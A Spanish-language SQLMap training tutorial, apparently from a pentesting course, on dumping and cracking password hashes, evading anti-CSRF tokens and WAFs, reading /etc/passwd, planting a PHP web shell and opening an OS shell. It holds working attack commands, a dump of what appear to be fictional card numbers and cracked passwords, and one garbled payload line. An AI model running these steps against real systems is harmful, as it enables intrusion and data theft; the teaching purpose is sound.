Cuando se trata de estructuras de bases de datos complejas con numerosas tablas y columnas, podemos buscar bases de datos, tablas y columnas de interés, utilizando el `--search` opción. Esta opción nos permite buscar nombres de identificadores utilizando el `LIKE` operador. Por ejemplo, si estamos buscando todos los nombres de tabla que contienen la palabra clave `user`, podemos ejecutar SQLMap de la siguiente manera:

  Enumeración Avanzada de Base de Datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user

...SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+

Database: information_schema
[1 table]
+-----------------+
| USER_PRIVILEGES |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+

do you want to dump found table(s) entries? [Y/n] 
...SNIP...
```

En el ejemplo anterior, podemos detectar inmediatamente un par de objetivos de recuperación de datos interesantes basados en estos resultados de búsqueda. También podríamos haber intentado buscar todos los nombres de columna basados en una palabra clave específica (por ejemplo. `pass`):

  Enumeración Avanzada de Base de Datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+

Database: mysql
Table: servers
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(64) |
+----------+----------+
```

---

## Enumeración y Cracking de Contraseña

Una vez que identificamos una tabla que contiene contraseñas (por ejemplo. `master.users`), podemos recuperar esa tabla con el `-T` opción, como se muestra anteriormente:

  Enumeración Avanzada de Base de Datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

...SNIP...
[14:31:41] [INFO] fetching columns for table 'users' in database 'master'
[14:31:41] [INFO] fetching entries for table 'users' in database 'master'
[14:31:41] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to crack them via a dictionary-based attack? [Y/n/q] Y

[14:31:41] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:31:41] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:31:41] [INFO] starting 8 processes 
[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         
[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         
...SNIP...
[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        
Database: master                                                                                                                                                                                          
Table: users
[32 entries]
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |
| 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
```

Podemos ver en el ejemplo anterior que SQLMap tiene capacidades automáticas de descifrado de hashes de contraseña. Al recuperar cualquier valor que se asemeje a un formato hash conocido, SQLMap nos pide que realicemos un ataque basado en diccionario en los hashes encontrados.

Los ataques de craqueo de hash se realizan de manera multiprocesamiento, según la cantidad de núcleos disponibles en la computadora del usuario. Actualmente, existe un soporte implementado para descifrar 31 tipos diferentes de algoritmos hash, con un diccionario incluido que contiene 1.4 millones de entradas (compilado a lo largo de los años con las entradas más comunes que aparecen en fugas de contraseña disponibles públicamente). Por lo tanto, si no se elige aleatoriamente un hash de contraseña, existe una buena probabilidad de que SQLMap lo rompa automáticamente.

---

## DB Usuarios Contraseña Enumeración y Cracking

Además de las credenciales de usuario que se encuentran en las tablas DB, también podemos intentar volcar el contenido de las tablas del sistema que contienen credenciales específicas de la base de datos (por ejemplo, credenciales de conexión). Para facilitar todo el proceso, SQLMap tiene un interruptor especial `--passwords` diseñado especialmente para tal tarea:

  Enumeración Avanzada de Base de Datos

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch

...SNIP...
[14:25:20] [INFO] fetching database users password hashes
[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'root'
[14:25:20] [INFO] retrieved: 'debian-sys-maint'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N

do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y

[14:25:20] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:25:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
[14:25:20] [INFO] starting 8 processes 
[14:25:26] [INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass

[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 14:25:28 /2020-09-18/
```

Consejo: El interruptor '-all' en combinación con el interruptor '-batch', automa(g)ically hará todo el proceso de enumeración en el propio objetivo, y proporcionará los detalles de enumeración completa.

Esto básicamente significa que todo lo accesible se recuperará, potencialmente funcionando durante mucho tiempo. Tendremos que encontrar los datos de interés en los archivos de salida manualmente.


# Eludir las Protecciones de Aplicaciones Web

---

No habrá ningún protection(s) desplegado en el lado objetivo en un escenario ideal, por lo que no se evitará la explotación automática. De lo contrario, podemos esperar problemas al ejecutar una herramienta automatizada de cualquier tipo contra dicho objetivo. Sin embargo, muchos mecanismos se incorporan en SQLMap, lo que puede ayudarnos a evitar con éxito tales protecciones.

---

## Bypass de Token Anti-CSRF

Una de las primeras líneas de defensa contra el uso de herramientas de automatización es la incorporación de tokens anti-CSRF (es decir, Cross-Site Request Forgery) en todas las solicitudes HTTP, especialmente las generadas como resultado del llenado de formularios web.

En la mayoría de los términos básicos, cada solicitud HTTP en tal escenario debería tener un valor de token (válido) disponible solo si el usuario realmente visitó y usó la página. Si bien la idea original era la prevención de escenarios con enlaces maliciosos, donde solo abrir estos enlaces tendría consecuencias no deseadas para los usuarios no informados (por ejemplo, abrir páginas de administrador y agregar un nuevo usuario con credenciales predefinidas), esta función de seguridad también endureció inadvertidamente las aplicaciones contra la automatización (no deseada).

Sin embargo, SQLMap tiene opciones que pueden ayudar a evitar la protección anti-CSRF. A saber, la opción más importante es `--csrf-token`. Al especificar el nombre del parámetro token (que ya debería estar disponible dentro de los datos de solicitud proporcionados), SQLMap intentará automáticamente analizar el contenido de la respuesta de destino y buscar nuevos valores de token para que pueda usarlos en la siguiente solicitud.

Además, incluso en un caso en el que el usuario no especifique explícitamente el nombre del token a través de `--csrf-token`, si uno de los parámetros proporcionados contiene cualquiera de los infijos comunes (es decir. `csrf`, `xsrf`, `token`), se le pedirá al usuario si lo actualiza en otras solicitudes:

  Eludir las Protecciones de Aplicaciones Web

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:18:01 /2020-09-18/

POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
```

---

## Bypass de Valor Único

En algunos casos, la aplicación web solo puede requerir que se proporcionen valores únicos dentro de parámetros predefinidos. Tal mecanismo es similar a la técnica anti-CSRF descrita anteriormente, excepto que no hay necesidad de analizar el contenido de la página web. Por lo tanto, simplemente asegurando que cada solicitud tenga un valor único para un parámetro predefinido, la aplicación web puede evitar fácilmente los intentos de CSRF y, al mismo tiempo, evitar algunas de las herramientas de automatización. Para esto, la opción `--randomize` se debe utilizar, señalando el nombre del parámetro que contiene un valor que debe ser aleatorizado antes de ser enviado:

  Eludir las Protecciones de Aplicaciones Web

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
URI: http://www.example.com:80/?id=9030&rp=36456
URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
```

---

## Bypass de Parámetros Calculados

Otro mecanismo similar es cuando una aplicación web espera que se calcule un valor de parámetro adecuado en función de algún otro valor(s) de parámetro. Muy a menudo, un valor de parámetro tiene que contener el resumen del mensaje (p. ej. `h=MD5(id)`) de otro. Para evitar esto, la opción `--eval` se debe usar, donde se está evaluando un código Python válido justo antes de enviar la solicitud al objetivo:

  Eludir las Protecciones de Aplicaciones Web

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
```

---

## Ocultación de Dirección IP

En caso de que queramos ocultar nuestra dirección IP, o si una determinada aplicación web cuenta con un mecanismo de protección que encuadre nuestra dirección IP actual, podemos intentar utilizar un proxy o la red de anonimato Tor. Se puede establecer un proxy con la opción `--proxy` (p. ej. `--proxy="socks4://177.39.187.70:33283"`), donde deberíamos agregar un proxy de trabajo.

Además de eso, si tenemos una lista de proxies, podemos proporcionarlos a SQLMap con la opción `--proxy-file`. De esta manera, SQLMap pasará secuencialmente a través de la lista, y en caso de cualquier problema (por ejemplo, lista negra de la dirección IP), simplemente saltará de actual a siguiente de la lista. La otra opción es el uso de la red Tor para proporcionar una anonimización fácil de usar, donde nuestra IP puede aparecer en cualquier lugar de una gran lista de nodos de salida Tor. Cuando se instala correctamente en la máquina local, debe haber un `SOCKS4` servicio proxy en el puerto local 9050 o 9150. Usando el interruptor `--tor`, SQLMap intentará automáticamente encontrar el puerto local y usarlo adecuadamente.

Si quisiéramos estar seguros de que Tor se está utilizando correctamente, para evitar comportamientos no deseados, podríamos usar el interruptor `--check-tor`. En tales casos, SQLMap se conectará al `https://check.torproject.org/` y compruebe la respuesta para el resultado previsto (es decir, `Congratulations` aparece dentro).

---

## bypass WAF

Cada vez que ejecutamos SQLMap, como parte de las pruebas iniciales, SQLMap envía una carga útil maliciosa predefinida utilizando un nombre de parámetro inexistente (por ejemplo. `?pfov=...`) para probar la existencia de un WAF (Web Application Firewall). Habrá un cambio sustancial en la respuesta en comparación con el original en caso de cualquier protección entre el usuario y el objetivo. Por ejemplo, si se implementa una de las soluciones WAF más populares (ModSecurity), debería haber una `406 - Not Acceptable` respuesta después de tal solicitud.

En caso de una detección positiva, para identificar el mecanismo de protección real, SQLMap utiliza una biblioteca de terceros [identywaf](https://github.com/stamparm/identYwaf), que contiene las firmas de 80 soluciones WAF diferentes. Si quisiéramos omitir esta prueba heurística por completo (es decir, para producir menos ruido), podemos usar el interruptor `--skip-waf`.

---

## Bypass de lista negra de agente de usuario

En caso de problemas inmediatos (por ejemplo, código de error HTTP 5XX desde el principio) mientras se ejecuta SQLMap, una de las primeras cosas que deberíamos pensar es la posible lista negra del agente de usuario predeterminado utilizado por SQLMap (por ejemplo. `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`).

Esto es trivial para evitar con el interruptor `--random-agent`, que cambia el agente de usuario predeterminado con un valor elegido al azar de un gran conjunto de valores utilizados por los navegadores.

Nota: Si se detecta alguna forma de protección durante la ejecución, podemos esperar problemas con el objetivo, incluso otros mecanismos de seguridad. La razón principal es el desarrollo continuo y las nuevas mejoras en tales protecciones, dejando espacio de maniobra cada vez más pequeño para los atacantes.

---

## Scripts Tamper

Finalmente, uno de los mecanismos más populares implementados en SQLMap para eludir las soluciones WAF/IPS son los llamados scripts "tamper". Los scripts manipulados son un tipo especial de scripts (Python) escritos para modificar solicitudes justo antes de ser enviados al objetivo, en la mayoría de los casos para evitar cierta protección.

Por ejemplo, uno de los scripts de manipulación más populares [entre](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) está reemplazando todas las ocurrencias de mayor que el operador (`>`) con `NOT BETWEEN 0 AND #`y el operador igual (`=`) con `BETWEEN # AND #`. De esta manera, muchos mecanismos de protección primitivos (enfocados principalmente en la prevención de ataques XSS) se omiten fácilmente, al menos con fines SQLi.

Los scripts de manipulación se pueden encadenar, uno tras otro, dentro del `--tamper` opción (p. ej. `--tamper=between,randomcase`), donde se ejecutan en función de su prioridad predefinida. Una prioridad está predefinida para evitar cualquier comportamiento no deseado, ya que algunos scripts modifican las cargas útiles modificando su sintaxis SQL (por ejemplo. [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). Por el contrario, a algunos scripts de manipulación no les importa el contenido interno (por ejemplo. [apéndice](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).

Los scripts de manipulación pueden modificar cualquier parte de la solicitud, aunque la mayoría cambia el contenido de la carga útil. Los scripts de manipulación más notables son los siguientes:

|**Tamper-Script**|**Descripción**|
|---|---|
|`0eunion`|Reemplaza las instancias de UNIÓN con e0UNIÓN|
|`base64encode`|Base64 codifica todos los caracteres en una carga útil dada|
|`between`|Reemplaza mayor que el operador (`>`) con `NOT BETWEEN 0 AND #` y es igual al operador (`=`) con `BETWEEN # AND #`|
|`commalesslimit`|Reemplaza instancias (MySQL) como `LIMIT M, N` con `LIMIT N OFFSET M` contraparte|
|`equaltolike`|Reemplaza todas las ocurrencias del operador igual (`=`) con `LIKE` contraparte|
|`halfversionedmorekeywords`|Agrega (MySQL) comentario versionado antes de cada palabra clave|
|`modsecurityversioned`|Abraza la consulta completa con el comentario versionado (MySQL)|
|`modsecurityzeroversioned`|Abraza la consulta completa con el comentario de versión cero (MySQL)|
|`percentage`|Agrega un signo de porcentaje (`%`) delante de cada carácter (p. ej. SELECCIONE -> %S%E%L%E%C%T)|
|`plus2concat`|Reemplaza más operador (`+`) con la función (MsSQL) CONCAT() contraparte|
|`randomcase`|Reemplaza cada carácter de palabra clave con un valor de caso aleatorio (por ejemplo. SELECT -> SEleCt)|
|`space2comment`|Reemplaza el carácter de espacio ( ) con comentarios '/|
|`space2dash`|Reemplaza el carácter de espacio ( ) con un comentario de tablero (`--`) seguido de una cadena aleatoria y una nueva línea (`\n`)|
|`space2hash`|Reemplaza (MySQL) instancias de carácter de espacio ( ) con un carácter de libra (`#`) seguido de una cadena aleatoria y una nueva línea (`\n`)|
|`space2mssqlblank`|Reemplaza (MsSQL) instancias de carácter de espacio ( ) con un carácter en blanco aleatorio de un conjunto válido de caracteres alternativos|
|`space2plus`|Reemplaza el carácter de espacio ( ) con más (`+`)|
|`space2randomblank`|Reemplaza el carácter de espacio ( ) con un carácter en blanco aleatorio de un conjunto válido de caracteres alternativos|
|`symboliclogical`|Reemplaza a los operadores lógicos AND y OR con sus contrapartes simbólicas (`&&` y `\|`)|
|`versionedkeywords`|Encierra cada palabra clave no funcional con el comentario versionado (MySQL)|
|`versionedmorekeywords`|Encierra cada palabra clave con el comentario versionado (MySQL)|

Para obtener una lista completa de scripts de manipulación implementados, junto con la descripción anterior, cambie `--list-tampers` se puede utilizar. También podemos desarrollar scripts Tamper personalizados para cualquier tipo de ataque personalizado, como un SQLi de segundo orden.

---

## Pases Diversos

Fuera de otros mecanismos de derivación de protección, también hay dos más que deben mencionarse. El primero es el `Chunked` codificación de transferencia, activada usando el interruptor `--chunked`, que divide el cuerpo de la solicitud POST en los llamados "trozos." Las palabras clave SQL en la lista negra se dividen entre trozos de manera que la solicitud que los contiene puede pasar desapercibida.

Los otros mecanismos de derivación son los `HTTP parameter pollution` (`HPP`), donde las cargas útiles se dividen de manera similar a como en el caso de `--chunked` entre diferentes valores denominados del mismo parámetro (p. ej. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), que están concatenados por la plataforma objetivo si la soportan (p. ej. `ASP`).


# Explotación OS

---

SQLMap tiene la capacidad de utilizar una inyección SQL para leer y escribir archivos desde el sistema local fuera del DBMS. SQLMap también puede intentar darnos ejecución directa de comandos en el host remoto si tuviéramos los privilegios adecuados.

---

## Archivo Leer/Escribir

La primera parte de la Explotación de SO a través de una vulnerabilidad de inyección SQL es leer y escribir datos en el servidor de alojamiento. Leer datos es mucho más común que escribir datos, que es estrictamente privilegiado en los DBMS modernos, ya que puede conducir a la explotación del sistema, como veremos. Por ejemplo, en MySql, para leer archivos locales, el usuario de DB debe tener el privilegio de `LOAD DATA` y `INSERT`, para poder cargar el contenido de un archivo en una tabla y luego leer esa tabla.

Un ejemplo de tal comando es:

- `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

Si bien no necesariamente necesitamos tener privilegios de administrador de base de datos (DBA) para leer datos, esto se está volviendo más común en los DBMS modernos. Lo mismo se aplica a otras bases de datos comunes. Aún así, si tenemos privilegios de DBA, entonces es mucho más probable que tengamos privilegios de lectura de archivos.

---

## Comprobación de privilegios de DBA

Para comprobar si tenemos privilegios DBA con SQLMap, podemos utilizar el `--is-dba` opción:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 17:31:55 /2020-11-19/

[17:31:55] [INFO] resuming back-end DBMS 'mysql'
[17:31:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: False

[*] ending @ 17:31:56 /2020-11-19
```

Como podemos ver, si lo probamos en uno de los ejercicios anteriores, obtenemos `current user is DBA: False`, lo que significa que no tenemos acceso a DBA. Si intentáramos leer un archivo usando SQLMap, obtendríamos algo como:

  Explotación OS

```shell-session
[17:31:43] [INFO] fetching file: '/etc/passwd'
[17:31:43] [ERROR] no data retrieved
```

Para probar la explotación del SO, intentemos un ejercicio en el que tengamos privilegios de DBA, como se ve en las preguntas al final de esta sección:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.11#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:37:47 /2020-11-19/

[17:37:47] [INFO] resuming back-end DBMS 'mysql'
[17:37:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
current user is DBA: True

[*] ending @ 17:37:48 /2020-11-19/
```

Vemos que esta vez tenemos `current user is DBA: True`, lo que significa que podemos tener el privilegio de leer archivos locales.

---

## Lectura de Archivos Locales

En lugar de inyectar manualmente la línea anterior a través de SQLi, SQLMap hace que sea relativamente fácil leer archivos locales con el `--file-read` opción:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:40:00 /2020-11-19/

[17:40:00] [INFO] resuming back-end DBMS 'mysql'
[17:40:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[17:40:01] [INFO] fetching file: '/etc/passwd'
[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
[17:40:07] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y

[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
files saved to [1]:
[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)

[*] ending @ 17:40:14 /2020-11-19/
```

Como podemos ver, SQLMap dijo `files saved` a un archivo local. Podemos `cat` el archivo local para ver su contenido:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

Hemos recuperado con éxito el archivo remoto.

---

## Escribir Archivos Locales

Cuando se trata de escribir archivos en el servidor de alojamiento, se vuelve mucho más restringido en los DMBS modernos, ya que podemos utilizar esto para escribir un Web Shell en el servidor remoto y, por lo tanto, obtener la ejecución de código y hacerse cargo del servidor.

Esta es la razón por la cual los DBMS modernos deshabilitan la escritura de archivos de forma predeterminada y necesitan ciertos privilegios para que los DBA puedan escribir archivos. Por ejemplo, en MySql, el `--secure-file-priv` la configuración debe deshabilitarse manualmente para permitir escribir datos en archivos locales utilizando el `INTO OUTFILE` consulta SQL, además de cualquier acceso local necesario en el servidor host, como el privilegio de escribir en el directorio que necesitamos.

Aún así, muchas aplicaciones web requieren la capacidad de DBMS para escribir datos en archivos, por lo que vale la pena probar si podemos escribir archivos en el servidor remoto. Para hacer eso con SQLMap, podemos usar el `--file-write` y `--file-dest` opciones. Primero, preparemos un shell web PHP básico y escríbalo en un `shell.php` archivo:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, intentemos escribir este archivo en el servidor remoto, en el `/var/www/html/` directorio, la raíz web del servidor predeterminado para Apache. Si no conocíamos la raíz web del servidor, veremos cómo SQLMap puede encontrarla automáticamente.

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:54:18 /2020-11-19/

[17:54:19] [INFO] resuming back-end DBMS 'mysql'
[17:54:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y

[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

[*] ending @ 17:54:28 /2020-11-19/
```

Vemos que SQLMap confirmó que el archivo estaba escrito:

  Explotación OS

```shell-session
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
```

Ahora, podemos intentar acceder al shell PHP remoto y ejecutar un comando de muestra:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la

total 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

Vemos que nuestro shell PHP fue escrito en el servidor remoto, y que tenemos ejecución de comandos sobre el servidor host.

---

## Ejecución de Comando OS

Ahora que confirmamos que podríamos escribir un shell PHP para obtener la ejecución de comandos, podemos probar la capacidad de SQLMap para darnos un shell OS fácil sin escribir manualmente un shell remoto. SQLMap utiliza varias técnicas para obtener un shell remoto a través de vulnerabilidades de inyección SQL, como escribir un shell remoto, como acabamos de hacer, escribir funciones SQL que ejecutan comandos y recuperan la salida o incluso usar algunas consultas SQL que ejecutan directamente el comando OS, como `xp_cmdshell` en Microsoft SQL Server. Para obtener un shell OS con SQLMap, podemos usar el `--os-shell` opción, de la siguiente manera:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:02:15 /2020-11-19/

[18:02:16] [INFO] resuming back-end DBMS 'mysql'
[18:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output
```

Vemos que SQLMap ha predeterminado `UNION` técnica para obtener un shell OS, pero finalmente no nos dio ninguna salida `No output`. Entonces, como ya sabemos, tenemos múltiples tipos de vulnerabilidades de inyección SQL, intentemos especificar otra técnica que tenga más posibilidades de darnos salida directa, como la `Error-based SQL Injection`, que podemos especificar con `--technique=E`:

  Explotación OS

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 18:05:59 /2020-11-19/

[18:05:59] [INFO] resuming back-end DBMS 'mysql'
[18:05:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
